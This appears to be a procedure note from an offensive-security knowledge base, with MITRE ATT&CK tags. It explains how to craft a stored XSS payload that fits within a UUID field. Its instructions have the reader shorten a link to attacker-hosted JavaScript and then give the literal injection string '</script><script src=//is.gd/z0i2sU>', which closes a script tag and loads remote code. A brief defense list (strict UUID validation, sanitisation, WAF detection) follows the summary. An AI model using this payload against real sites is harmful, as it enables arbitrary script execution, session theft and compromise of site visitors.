---
tags:
  - xss
  - payload-crafting
type: procedure
tools:
  - '[[tools/is-gd-url-shortener]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 25f7018f-1c6d-45c0-b65b-5e2b0f34edb6
created_at: '2025-12-13T23:56:20.221Z'
updated_at: '2025-12-13T23:56:20.221Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft Malicious UUID Payload

## Summary

This procedure crafts a UUID string that injects a stored XSS payload by closing an existing script tag and loading an external malicious script.

## Description

The payload is designed to fit UUID length limits while breaking out of the script context. Using a URL shortener ensures the external script URL is concise. This enables arbitrary JS execution when rendered.

## Requirements

1. URL shortening service
2. Malicious JS hosted externally
3. Understanding of XSS payload construction

## Defense

Defensive measures and detection strategies:

- Validate UUID format strictly (e.g., alphanumeric only)
- Sanitize inputs before storage
- Detect script tags in user inputs via WAF

## Objectives

1. Create a payload that injects XSS
2. Ensure it fits length constraints
3. Load external script for execution

## Instructions

### Step 1: Shorten Malicious URL

**Context**: Use a shortener to reduce URL length.

Use [[tools/is-gd-url-shortener]] to create a short link like //is.gd/z0i2sU pointing to your malicious JS.

> Shortened URL ready for payload.

### Step 2: Build Payload

**Context**: Construct the UUID string.

Combine as '</script><script src=//is.gd/z0i2sU>' to close and inject.

> Test length to ensure it fits restrictions.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used

- [[tools/is-gd-url-shortener]]

## Tags

- xss
- payload-crafting
